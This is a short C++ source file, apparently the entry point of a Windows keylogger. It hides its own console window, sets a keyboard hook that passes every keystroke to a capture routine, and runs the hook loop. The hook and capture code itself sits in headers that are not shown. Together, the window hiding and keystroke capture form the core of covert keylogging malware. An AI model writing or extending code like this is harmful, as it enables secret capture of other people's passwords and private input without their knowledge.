#include <stdafx.h>
#include <hook.h>
#include <capture.h>

int
main()
{
	const HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	DwmSetWindowAttribute(hwnd, DWMWCP_DONOTROUND, 0, 0);

	hook hhook;
	hhook.keystroke = &capture::capture_key;

	if (hhook.hook_set() != 0) {
		exit(1);
	}

	hhook.hook_loop();
	return hhook.hook_release() != 0 ? -1 : 0;
}